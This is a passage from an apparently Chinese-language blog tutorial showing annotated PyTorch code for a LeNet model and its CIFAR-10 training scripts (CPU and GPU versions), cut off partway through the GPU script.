class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn<span class="comment"># These are the basic building blocks for graphs:ref: https://pytorch.org/docs/stable/nn.html</span></span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F<span class="comment"># 包含了各种功能ref: https://pytorch.org/docs/stable/nn.functional.html</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeNet</span>(<span class="params">nn.Module</span>):</span><span class="comment"># nn.module 是所有神经网络的基类，modules也可以包含其他modules，允许将它们嵌套在树结构中。ref: https://pytorch.org/docs/stable/generated/torch.nn.Module.html#torch.nn.Module</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(LeNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, <span class="number">5</span>)<span class="comment"># 定义了卷积层conv1，函数原型如下：torch.nn.Conv2d(in_channels, out_channels, kernel_size, stride=1, padding=0, dilation=1, groups=1, bias=True, padding_mode=&#x27;zeros&#x27;)， 第一个参数（in_channels）就是输入特征层的深度，这里的3表示输入的是RGB彩色图片，第二个参数（out_channels）表示了卷积核的个数，这里使用了16个卷积核，第三个参数表示了卷积核的尺寸，可以是int类型，如5 代表卷积核的height=width=5，也可以是tuple类型如(3, 5)代表卷积核的height=3，width=5，这里卷积核的大小是5*5， 第四个参数（stride）表示卷积核的步长，这里缺省值为1，和kernel_size一样输入可以是int型，也可以是tuple类型。 第五个参数（padding）表示填充0的行列数， 可以为int型如1，即补一圈0，如果输入为tuple型如(2, 1) 代表在上下补2行，左右补1列。其他参数的含义可以参考官方文档. ref1: https://blog.csdn.net/qq_37541097/article/details/102926037 , ref2: https://pytorch.org/docs/stable/generated/torch.nn.Conv2d.html#torch.nn.Conv2d</span></span><br><span class="line">        self.pool1 = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)<span class="comment"># 定义了池化层（下采样层）pool1，函数原型如下： MaxPool2d(kernel_size, stride)。 池化核大小为2*2 步长为2，使用了最大值池化的池化层操作（取采样区域的最大值作为采样结果），池化层不改变深度，只影响高度和宽度，</span></span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">16</span>, <span class="number">32</span>, <span class="number">5</span>)<span class="comment">#  定义了卷积层conv2</span></span><br><span class="line">        self.pool2 = nn.MaxPool2d(<span class="number">2</span>, <span class="number">2</span>)<span class="comment"># 定义了池化层（下采样层）pool2</span></span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">32</span>*<span class="number">5</span>*<span class="number">5</span>, <span class="number">120</span>)  <span class="comment"># 定义全连接层，Linner的作用就是对输入的数据进行一维线性变换，也就是传统的神经网络层与层之间的关系。这里的120值来源于上面3.2.2.2章节的那张经典的Lenet图: C5：layerref:  https://pytorch.org/docs/stable/generated/torch.nn.Linear.html#torch.nn.Linear</span></span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)<span class="comment"># 同理</span></span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">10</span>) <span class="comment"># 这里的10就是我们要分类的类别数量，这里的图像分类我们要把它图像分为十个类别之一，包括：‘airplane’, ‘automobile’, ‘bird’, ‘cat’, ‘deer’, ‘dog’, ‘frog’, ‘horse’, ‘ship’, ‘truck’. 恰好与上面的3.2.2.2章节的那张经典的Lenet图C7的数目对应上了，实际上这里可以是20，可以是30，取决于我们要分多少类。</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.conv1(x))    <span class="comment"># input(3, 32, 32) output(16, 28, 28)这里输入的是32*32的rgb图像，而conv1是16个5x5的卷积核，所以通过我们得到的输出的形状为（16, 28, 28），这里的计算可以参考2.3.3.2章节。这里使用了relu作为了激活层函数。</span></span><br><span class="line">        x = self.pool1(x)            <span class="comment"># output(16, 14, 14)这里使用了大小为2*2 步长为2的池化核，经过简单的计算，输出的形状为(16, 14, 14)</span></span><br><span class="line">        x = F.relu(self.conv2(x))    <span class="comment"># output(32, 10, 10)同理，conv2是32个5x5的卷积核，简单的计算得到输出的形状为(32, 10, 10)</span></span><br><span class="line">        x = self.pool2(x)            <span class="comment"># output(32, 5, 5)</span></span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">32</span>*<span class="number">5</span>*<span class="number">5</span>)       <span class="comment"># output(32*5*5)这里实际相当于一个展平的操作，实际上view不仅可以将数据转变为一维数据，也可以转换为其他形式，如(4, 4)可以转换为(2, 8)，也可以转换为一维的(16)，前面的-1代表这里我可以不计算，由其他的数据来推断出来，如(4, 4) -&gt; (-1, 8)，后面-1将会替换为2. ref: https://pytorch.org/docs/stable/generated/torch.Tensor.view.html?highlight=view#torch.Tensor.view这步展平的操作也可以使用flatten，官方就是这样做的ref: https://pytorch.org/docs/stable/generated/torch.nn.Flatten.html#torch.nn.Flatten</span></span><br><span class="line">        x = F.relu(self.fc1(x))      <span class="comment"># output(120)全连接层处理</span></span><br><span class="line">        x = F.relu(self.fc2(x))      <span class="comment"># output(84) 全连接层处理</span></span><br><span class="line">        x = self.fc3(x)              <span class="comment"># output(10)可以发现，这里已经是最终的输出了，但是这里没有输出优化函数（我们常见的softmax）进行处理。那是因为在后面pytorch定义损失函数时使用了CrossEntropyLoss已经做了softmax层处理，这里就不需要重复做这个操作了。</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line"><span class="comment"># # 测试输出</span></span><br><span class="line"><span class="comment"># import torch</span></span><br><span class="line"><span class="comment"># model=LeNet()</span></span><br><span class="line"><span class="comment"># print(model)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 输出如下，可以看到与经典的Lenet模型是一致的。</span></span><br><span class="line"><span class="comment"># LeNet(</span></span><br><span class="line"><span class="comment">#   (conv1): Conv2d(3, 16, kernel_size=(5, 5), stride=(1, 1))</span></span><br><span class="line"><span class="comment">#   (pool1): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)</span></span><br><span class="line"><span class="comment">#   (conv2): Conv2d(16, 32, kernel_size=(5, 5), stride=(1, 1))</span></span><br><span class="line"><span class="comment">#   (pool2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)</span></span><br><span class="line"><span class="comment">#   (fc1): Linear(in_features=800, out_features=120, bias=True)</span></span><br><span class="line"><span class="comment">#   (fc2): Linear(in_features=120, out_features=84, bias=True)</span></span><br><span class="line"><span class="comment">#   (fc3): Linear(in_features=84, out_features=10, bias=True)</span></span><br><span class="line"><span class="comment"># )</span></span><br></pre></td></tr></table></figure><h5 id="3-2-3-3-train-py"><a href="#3-2-3-3-train-py" class="headerlink" title="3.2.3.3 train.py"></a>3.2.3.3 train.py</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision<span class="comment"># 该库是 PyTorch 项目的一部分。 PyTorch 是一个开源机器学习框架。torchvision 包由流行的数据集、模型架构和用于计算机视觉的常见图像资源组成。ref: https://pytorch.org/vision/stable/index.html</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> LeNet<span class="comment"># 我们在model.py中已经定义了LeNet的类</span></span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim<span class="comment"># torch.optim是一个实现各种优化算法的包。最常用的方法都已经支持了，接口也足够通用，以后也可以轻松集成更复杂的方法。这里使用的adam也包含在内ref: https://pytorch.org/docs/stable/optim.html</span></span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms<span class="comment"># 包含了常见的图像变换，方便对图像格式与张量等的相互转换。我们自定义图像处理过程需要用到这个库。 ref: https://pytorch.org/vision/stable/transforms.html</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    transform = transforms.Compose(<span class="comment"># torchvision.transforms.Compose：将多个变换组合在一起形成一个变换过程。ref: https://pytorch.org/vision/stable/generated/torchvision.transforms.Compose.html#torchvision.transforms.Compose</span></span><br><span class="line">        [transforms.ToTensor(), <span class="comment"># torchvision.transforms.ToTensor： 将 PIL 图像或 numpy.ndarray 转换为张量。由于torchvision 数据集的输出是范围 [0, 1] 的 PILImage 图像，我们首先要将其转换为张量（Tensor）方便后续的操作。ref: https://pytorch.org/vision/stable/generated/torchvision.transforms.ToTensor.html?highlight=totensor</span></span><br><span class="line">         transforms.Normalize((<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>), (<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>))])<span class="comment"># 用均值和标准差对张量图像进行标准化。此转换不支持 PIL Image*（所以前面需要使用ToTensor将PILImage转换为张量）。函数原型为： torchvision.transforms.Normalize(mean, std, inplace=False)第一个参数（mean）表示每个通道的均值序列。第二个参数（std）表示每个通道的标准差序列。第三个参数（inplace）表示是否立即执行此操作，默认为False。  ref: https://pytorch.org/vision/stable/generated/torchvision.transforms.Normalize.html?highlight=normalize</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 50000张训练图片</span></span><br><span class="line">    <span class="comment"># 第一次使用时要将download设置为True才会自动去下载数据集</span></span><br><span class="line">    train_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">True</span>,</span><br><span class="line">                                             download=<span class="literal">False</span>, transform=transform)<span class="comment"># torchvision.datasets表示Torchvision 的内置数据集，CIFAR10就是其中一个数据集，也正是我们要使用的图片资源，CIFAR-10 数据集由 10 个类别的 60000 个 32x32 彩色图像组成，每个类别包含 6000 个图像。有 50000 个训练图像和 10000 个测试图像。数据集分为五个训练批次和一个测试批次，每个批次有 10000 张图像。测试批次恰好包含来自每个类别的 1000 个随机选择的图像。训练批次包含随机顺序的剩余图像，但一些训练批次可能包含来自一个类的图像多于另一个。在它们之间，训练批次恰好包含来自每个类别的 5000 张图像。这些类是完全互斥的。汽车和卡车之间没有重叠。“汽车”包括轿车、SUV 之类的东西。“卡车”只包括大卡车。两者都不包括皮卡车。 该函数的原型为：CLASS torchvision.datasets.CIFAR10(root: str, train: bool = True, transform: Optional[Callable] = None, target_transform: Optional[Callable] = None, download: bool = False)  第一个参数（root ）表示数据集的根目录，如果download设置为True，则将下载的文件保存到该目录。第二个参数（train）如果为True则从训练集创建数据集，否则从测试集创建。第三个参数（transform ）表示一个预处理函数，对传进来的函数进行简单的处理使其达到我们使用的要求。例如，transforms.RandomCrop。第四个参数（target_transform ）表示接收目标并对其进行转换的函数，这里没有用到。第五个参数（download）如果为 true，则从 Internet 下载数据集并将其放在根目录中。如果数据集已经下载，则不会再次下载。 ref: https://pytorch.org/vision/stable/generated/torchvision.datasets.CIFAR10.html#torchvision.datasets.CIFAR10</span></span><br><span class="line">    train_loader = torch.utils.data.DataLoader(train_set, batch_size=<span class="number">36</span>,</span><br><span class="line">                                               shuffle=<span class="literal">True</span>, num_workers=<span class="number">0</span>)<span class="comment"># torch.utils.data.DataLoader 为数据加载器，并可以对数据进行batch的划分，结合了数据集与取样器，并且可以提供多个线程处理数据集。在训练模型时使用到此函数，用来把训练数据分成多个小组 ，此函数每次抛出一组数据 。直至把所有的数据都抛出。实际上就是做一个数据的初始化。该函数的参数有很多，这里不展开说了，可以参考官方文档。简单说一下我们使用到的参数，train_set表示传入的数据集，batch_size表示每组数据的大小，shuffle设置为True表示在每个 epoch 重新洗牌数据（默认为False），num_workers表示用于数据加载的子进程数。0表示数据将在主进程中加载（默认为0），但是在如果在 Windows 上运行如果num_worker 不为0可能遇到 BrokenPipeError。ref: https://pytorch.org/docs/stable/data.html#torch.utils.data.DataLoader</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 10000张验证图片</span></span><br><span class="line">    <span class="comment"># 第一次使用时要将download设置为True才会自动去下载数据集</span></span><br><span class="line">    val_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">False</span>,</span><br><span class="line">                                           download=<span class="literal">False</span>, transform=transform)</span><br><span class="line">    val_loader = torch.utils.data.DataLoader(val_set, batch_size=<span class="number">5000</span>,</span><br><span class="line">                                             shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>)</span><br><span class="line">    val_data_iter = <span class="built_in">iter</span>(val_loader)<span class="comment"># iter返回迭代器对象，这里pytorch对其简单进行了封装重写，方便对多线程服务</span></span><br><span class="line">    val_image, val_label = val_data_iter.<span class="built_in">next</span>()<span class="comment"># 每一组都是图像和标签对应，类似于[[image1, laber1], [image2, label2], ....]</span></span><br><span class="line">    </span><br><span class="line">    classes = (<span class="string">&#x27;plane&#x27;</span>, <span class="string">&#x27;car&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;deer&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;frog&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;ship&#x27;</span>, <span class="string">&#x27;truck&#x27;</span>)<span class="comment"># 这里定义了所要分类的十个类别，这里使用了元组（tuple），里面的元素是不改变的，后面做判断的时候可以用得到</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 将这段代码取消注释，我们将可以看到图片数据，注意这样做的同时要将上面第25行的batch_size从5000改成16，否则一次性太多的图片不容易查看</span></span><br><span class="line">    <span class="comment"># import matplotlib.pyplot as plt</span></span><br><span class="line">    <span class="comment"># import numpy as np</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># # functions to show an image</span></span><br><span class="line">    <span class="comment"># def imshow(img):</span></span><br><span class="line">    <span class="comment">#     img = img / 2 + 0.5     # unnormalize</span></span><br><span class="line">    <span class="comment">#     npimg = img.numpy()</span></span><br><span class="line">    <span class="comment">#     plt.imshow(np.transpose(npimg, (1, 2, 0)))</span></span><br><span class="line">    <span class="comment">#     plt.show()</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># # use</span></span><br><span class="line">    <span class="comment"># print(&#x27; &#x27;.join(f&#x27;&#123;classes[val_label[j]]:5s&#125;&#x27; for j in range(16)))</span></span><br><span class="line">    <span class="comment"># imshow(torchvision.utils.make_grid(val_image))</span></span><br><span class="line">    </span><br><span class="line">    net = LeNet()</span><br><span class="line">    loss_function = nn.CrossEntropyLoss()<span class="comment"># 定义了损失函数，计算输入和目标之间的交叉熵损失。函数原型如下： torch.nn.CrossEntropyLoss(weight=None, size_average=None, ignore_index=- 100, reduce=None, reduction=&#x27;mean&#x27;, label_smoothing=0.0)。 由于这里已经包含了softmax操作，所以上面我们定义模型的时候不需要定义softmax进行输出优化。ref: https://pytorch.org/docs/stable/generated/torch.nn.CrossEntropyLoss.html#torch.nn.CrossEntropyLoss</span></span><br><span class="line">    optimizer = optim.Adam(net.parameters(), lr=<span class="number">0.001</span>)<span class="comment"># 定义了优化器，这里使用了adam优化器。函数原型如下：torch.optim.Adam(params, lr=0.001, betas=(0.9, 0.999), eps=1e-08, weight_decay=0, amsgrad=False, *, maximize=False)。 第一个参数表示可迭代的参数，这里将LeNet所有可训练的参数都进行训练。第二个参数表示学习率，默认值为0.001。其他参数的作用以及adam优化器的原理可以参考官网。ref: https://pytorch.org/docs/stable/generated/torch.optim.Adam.html#torch.optim.Adam</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 这里进入了正式训练的过程，代码中将训练集迭代了5次。</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># loop over the dataset multiple times</span></span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        <span class="keyword">for</span> step, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader, start=<span class="number">0</span>):<span class="comment"># enumerate函数提供了一个计数的功能，这里step的范围为(0,length(train_loader))，而每次迭代的data是两个list，一个list是形状为Tensor(36,3,32,32)的图片，另一个list是Tensor(36)的标签</span></span><br><span class="line">            <span class="comment"># get the inputs; data is a list of [inputs, labels]</span></span><br><span class="line">            inputs, labels = data<span class="comment"># 上面已经解释过了</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># zero the parameter gradients</span></span><br><span class="line">            optimizer.zero_grad()   <span class="comment"># Sets the gradients of all optimized torch.Tensor s to zero.清除历史梯度，如果不调用该函数，历史梯度将会累加，变相增加了batch的大小。如果batch过大，虽然运算可能更精准，但是需要耗费的时间可能会特别长ref: https://pytorch.org/docs/stable/generated/torch.optim.Optimizer.zero_grad.html#torch.optim.Optimizer.zero_grad</span></span><br><span class="line">            <span class="comment"># forward + backward + optimize</span></span><br><span class="line">            outputs = net(inputs)<span class="comment"># 使用我们自定义的卷积神经网络正向传播过程</span></span><br><span class="line">            loss = loss_function(outputs, labels)<span class="comment"># 计算交叉熵损失</span></span><br><span class="line">            loss.backward()<span class="comment"># 反向传播，计算当前张量w.r.t图的梯度# ref1： https://github.com/pytorch/pytorch/blob/18fcd4826f8866823a4410dacc73c95b3586cdf7/torch/_tensor.py#L344ref2： https://pytorch.org/docs/stable/generated/torch.Tensor.backward.html?highlight=backward#torch.Tensor.backward</span></span><br><span class="line">            optimizer.step()<span class="comment"># 进行参数更新的操作ref:  https://pytorch.org/docs/stable/generated/torch.optim.Optimizer.step.html#torch.optim.Optimizer.step</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># print statistics</span></span><br><span class="line">            running_loss += loss.item()</span><br><span class="line">            <span class="keyword">if</span> step % <span class="number">500</span> == <span class="number">499</span>:    <span class="comment"># print every 500 mini-batches，注意这个大小的选取与定义训练集的batch大小密不可分，个人的情况如下，训练集有50000张图片，我这里训练集的batch size为36，所以总batch为50000/36约等于1389，而这里以500为一次迭代，所以每个epoch会迭代两次</span></span><br><span class="line">                <span class="comment"># with torch.no_grad():# 这里的代码个人测试时不加也没影响，所以没加</span></span><br><span class="line">               outputs = net(val_image)  <span class="comment"># [batch, 10]  # val_image读取了包含了测试集的图片，val_image的shape为：Tensor(10000, 3, 32, 32) ，我将测试集的batch设置成了10000，而测试集图片总共就10000张，所以这里通过训练的卷积神经网络net处理的outputs的shape为： Tensor(10000, 10)，10代表的是10个类别各自的权值（当然这里也可以使用softmax进行处理，这样可以把权值转化为相应的概率，可以了解下推断出来的概率是多少）</span></span><br><span class="line">                predict_y = torch.<span class="built_in">max</span>(outputs, dim=<span class="number">1</span>)[<span class="number">1</span>]<span class="comment"># 选择这十个概率中数值最大的一个，代表推断出来的结果。函数原型为： torch.max(input, dim, keepdim=False, *, out=None)。 第一个参数（input）表示输入的张量。第二个参数（dim）表示要降低的维度，这里的Tensor为（10000, 10）要对10这个维度的数去取最大值，所以这里dim为1.第三个参数（keepdim ）表示输出张量是否dim保留。默认值为False。经过max函数得到的结果类型为两个Tensor列表。max[0]为权值列表，max[1]为结果列表，我们需要拿到结果列表与标签做对比来计算我们的正确率，所以后面加上了“[1]”</span></span><br><span class="line">                accuracy = torch.eq(predict_y, val_label).<span class="built_in">sum</span>().item() / val_label.size(<span class="number">0</span>)<span class="comment"># 判断标签与结果的相等数量再除以总数得到正确率。</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[%d, %5d] train_loss: %.3f  test_accuracy: %.3f&#x27;</span> %</span><br><span class="line">                      (epoch + <span class="number">1</span>, step + <span class="number">1</span>, running_loss / <span class="number">500</span>, accuracy))</span><br><span class="line">                running_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Finished Training&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    save_path = <span class="string">&#x27;./Lenet.pth&#x27;</span></span><br><span class="line">    torch.save(net.state_dict(), save_path)<span class="comment"># 将训练的状态字典进行保存，之后可以拿这个状态字典进行图像分类</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h5 id="3-2-3-4-train-py（GPU）"><a href="#3-2-3-4-train-py（GPU）" class="headerlink" title="3.2.3.4 train.py（GPU）"></a>3.2.3.4 train.py（GPU）</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># #  使用下面语句可以在有GPU时使用GPU，无GPU时使用CPU进行训练</span></span><br><span class="line"><span class="comment"># device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 也可以只指定GPU</span></span><br><span class="line"><span class="comment"># device = torch.device(&quot;cuda&quot;)# 或者 device = torch.device(&quot;cpu&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> LeNet</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The training equipment currently in use is: &quot;</span> + <span class="built_in">str</span>(device))</span><br><span class="line">    transform = transforms.Compose(</span><br><span class="line">        [transforms.ToTensor(),</span><br><span class="line">         transforms.Normalize((<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>), (<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="number">0.5</span>))])</span><br><span class="line">    <span class="comment"># 50000张训练图片</span></span><br><span class="line">    <span class="comment"># 第一次使用时要将download设置为True才会自动去下载数据集</span></span><br><span class="line">    train_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">True</span>,</span><br><span class="line">                                             download=<span class="literal">False</span>, transform=transform)</span><br><span class="line">    train_loader = torch.utils.data.DataLoader(train_set, batch_size=<span class="number">36</span>,</span><br><span class="line">                                               shuffle=<span class="literal">True</span>, num_workers=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 10000张验证图片</span></span><br><span class="line">    <span class="comment"># 第一次使用时要将download设置为True才会自动去下载数据集</span></span><br><span class="line">    val_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./data&#x27;</span>, train=<span class="literal">False</span>,</span><br><span class="line">                                           download=<span class="literal">False</span>, transform=transform)</span><br><span class="line">    val_loader = torch.utils.data.DataLoader(val_set, batch_size=<span class="number">10000</span>,</span><br><span class="line">                                             shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>)</span><br><span class="line">    val_data_iter = <span class="built_in">iter</span>(val_loader)</span><br><span class="line">    val_image, val_label = val_data_iter.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">    classes = (<span class="string">&#x27;plane&#x27;</span>, <span class="string">&#x27;car&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;deer&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;frog&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;ship&#x27;</span>, <span class="string">&#x27;truck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    net = LeNet()</span><br><span class="line">    net.to(device) <span class="comment"># 将网络分配到指定的device中</span></span><br><span class="line">    loss_function = nn.CrossEntropyLoss()</span><br><span class="line">    optimizer = optim.Adam(net.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        running_loss = <span class="number">0.0</span></span><br><span class="line">        time_start = time.perf_counter()</span><br><span class="line">        <span class="keyword">for</span> step, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader, start=<span class="number">0</span>):</span><br><span class="line">            inputs, labels = data</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = net(inputs.to(device))  <span class="comment"># 将inputs分配到指定的device中</span></span><br><span class="line">            loss = loss_function(outputs, labels.to(device))  <span class="comment"># 将labels分配到指定的device中</span></span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            running_loss += loss.item()</span><br><span class="line">            <span class="keyword">if</span> step % <span class="number">1000</span> == <span class="number">999</span>:</span><br><span class="line">                outputs = net(val_image.to(device)) <span class="comment"># 将test_image分配到指定的device中</span></span><br><span class="line">                predict_y = torch.<span class="built_in">max</span>(outputs, dim=<span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">                accuracy = (predict_y == val_label.to(device)).<span class="built_in">sum</span>().item() / val_label.size(<span class="number">0</span>) <span class="comment"># 将test_label分配到指定的device中</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[%d, %5d] train_loss: %.3f  test_accuracy: %.3f&#x27;</span> %</span><br><span class="line">                      (epoch + <span class="number">1</span>, step + <span class="number">1</span>, 